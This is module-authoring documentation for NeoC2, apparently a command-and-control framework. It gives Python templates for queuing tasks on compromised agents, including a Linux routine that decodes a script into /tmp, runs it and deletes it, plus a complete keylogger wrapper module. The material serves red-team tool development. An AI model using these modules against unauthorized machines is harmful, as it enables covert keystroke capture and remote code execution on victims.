# Modules for the NeoC2 Framework


## Creating a Basic Module

To create a custom module, the following are required by the Framework:

1. **External modules**: The script or executable located in the `modules/external/` directory to be executed on the active agent
2. **Python wrapper modules**: Python files that interface with external file
   
Every Python wrapper modules must be a Python file that implements two required functions:

### 1. `get_info()` function

This function returns metadata about the module:

```python
def get_info():
    return {
        "name": "module-name",
        "description": "Brief description of what the module does",
        "type": "reconnaissance|exploitation|post-exploitation|privesc|lateral-movement",
        "platform": "windows|linux|macos|all",
        "author": "Your Name",
        "references": ["https://link-to-reference.com"],
        "technique_id": "T1001,T1002",  # MITRE ATT&CK technique IDs
        "mitre_tactics": ["Initial Access", "Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the module on",
                "required": True
            },
            "custom_option": {
                "description": "A custom option for your module",
                "required": False,
                "default": "default_value"
            }
        }
    }
```

### 2. `execute()` function

This function contains the core logic for module execution:

```python
def execute(options, session):
    agent_id = options.get("agent_id")
    custom_option = options.get("custom_option", "default_value")

    # Validate inputs
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    # Set the current agent in the session
    session.current_agent = agent_id

    # Your module execution logic here

    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, command_to_execute)
        if task_id:
            return {
                "success": True,
                "output": f"Module task {task_id} queued for agent {agent_id}",
                "task_id": task_id
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
```

## Integrating External Scripts

To integrate external scripts:

1. Place the script in the `modules/external/` directory
2. Create a Python wrapper module that references the script

### Example: Integration

```python
import os
import re

def get_info():
    return {
        "name": "example-module",
        "description": "Execute an external script",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://example.com"],
        "technique_id": "T1059.001",  # Command and Scripting Interpreter: Script
        "mitre_tactics": ["Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the script on",
                "required": True
            },
            "parameter": {
                "description": "Parameter to pass to the script",
                "required": False,
                "default": ""
            }
        }
    }

def execute(options, session):
    agent_id = options.get("agent_id")
    parameter = options.get("parameter", "")

    if not agent_id:
        return {"success": False, "error": "agent_id is required"}

    # Validate inputs to prevent command injection
    if parameter and not re.match(r'^[a-zA-Z0-9_\-\.]+$', parameter):
        return {
            "success": False,
            "error": f"Invalid parameter: {parameter}. Contains invalid characters."
        }

    # Set the current agent in the session
    session.current_agent = agent_id

    # Read the external script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'YourScript.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading script: {str(e)}"
        }

    # Build the execution command with parameters
    execution_command = f'{original_script}\nYourFunction -Parameter "{parameter}"'

    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, execution_command)
        if task_id:
            return {
                "success": True,
                "output": f"Script task {task_id} queued for agent {agent_id}",
                "task_id": task_id
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
```

## Integrating Linux Shell Scripts

For Linux shell scripts, similar principles apply:

### Example: Shell Script Integration

```python
import os
import base64
import re

def get_info():
    return {
        "name": "example-linux-module",
        "description": "Execute an external Linux shell script",
        "type": "reconnaissance",
        "platform": "linux",
        "author": "NeoC2 Framework",
        "references": ["https://example.com"],
        "technique_id": "T1059.004",  # Command and Scripting Interpreter: Unix Shell
        "mitre_tactics": ["Discovery"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the script on",
                "required": True
            },
            "export_location": {
                "description": "Location to export collected files (default: /tmp)",
                "required": False,
                "default": "/tmp"
            }
        }
    }

def execute(options, session):
    agent_id = options.get("agent_id")
    export_location = options.get("export_location", "/tmp")

    if not agent_id:
        return {"success": False, "error": "agent_id is required"}

    if not re.match(r'^[a-zA-Z0-9_\-\/\.~]+$', export_location):
        return {
            "success": False,
            "error": f"Invalid export_location: {export_location}. Contains invalid characters."
        }

    # Set the current agent in the session
    session.current_agent = agent_id

    # Read the shell script content
    script_path = os.path.join(os.path.dirname(__file__), 'linux', 'your_script.sh')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            script_content = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find shell script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading shell script: {str(e)}"
        }

    # Encode the script content in base64 to transfer it
    script_b64 = base64.b64encode(script_content.encode()).decode()

    # Build command to transfer and execute the script
    temp_script_path = f"{export_location}/temp_script.sh"
    cmd = f"echo '{script_b64}' | base64 -d > {temp_script_path} && chmod +x {temp_script_path} && {temp_script_path} && rm {temp_script_path}"

    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, cmd)
        if task_id:
            return {
                "success": True,
                "output": f"Linux script task {task_id} queued for agent {agent_id}",
                "task_id": task_id
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
```

## Module Execution

To run a Custom module that passed basic compatibility check:

```
modules check <module_name>
run <module_name> <agent_id> [options]
```


## Module Registration

Modules are automatically loaded when:
1. The module file is placed in the `modules/` directory
2. The module file has a `.py` extension
3. The module implements both `get_info()` and `execute()` functions
4. The module passes compatibility checks

## Example: Complete Module Implementation

Here's a complete example of a simple keylogging module:

```python
import os
import importlib.util
import re

def get_info():
    return {
        "name": "example-keylogger",
        "description": "A simple keylogger module that logs keystrokes",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://example.com"],
        "technique_id": "T1056.001,T1059.001",  # Input Capture: Keylogging
        "mitre_tactics": ["Collection", "Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the keylogger on",
                "required": True
            },
            "log_path": {
                "description": "Path where keystrokes will be logged (default: %TEMP%\\key.log)",
                "required": False,
                "default": "%TEMP%\\key.log"
            },
            "timeout": {
                "description": "Time in minutes to capture keystrokes (default: runs indefinitely)",
                "required": False,
                "default": ""
            }
        }
    }

def execute(options, session):
    agent_id = options.get("agent_id")
    log_path = options.get("log_path", "%TEMP%\\key.log")
    timeout = options.get("timeout", "")

    if not agent_id:
        return {"success": False, "error": "agent_id is required"}

    if timeout and not re.match(r'^\d+(\.\d+)?$', timeout):
        return {
            "success": False,
            "error": f"Invalid timeout value: {timeout}. Must be a positive number"
        }

    # Sanitize log_path to prevent command injection
    if not re.match(r'^[a-zA-Z0-9_\-\\\/:%.~\s]+$', log_path):
        return {
            "success": False,
            "error": f"Invalid log_path: {log_path}. Contains invalid characters."
        }

    # Set the current agent in the session
    session.current_agent = agent_id

    # Read the original script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Get-Keystrokes.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find keylogger script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading keylogger script: {str(e)}"
        }

    # Build the execution command with parameters
    if timeout:
        execution_script = f'{original_script}\nGet-Keystrokes -LogPath "{log_path}" -Timeout {timeout}'
    else:
        execution_script = f'{original_script}\nGet-Keystrokes -LogPath "{log_path}"'

    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, execution_script)
        if task_id:
            return {
                "success": True,
                "output": f"Keylogger task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "log_path": log_path,
                "timeout": timeout if timeout else "indefinite"
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
```

This example demonstrates the complete module pattern including proper input validation, error handling, and integration with external scripts.

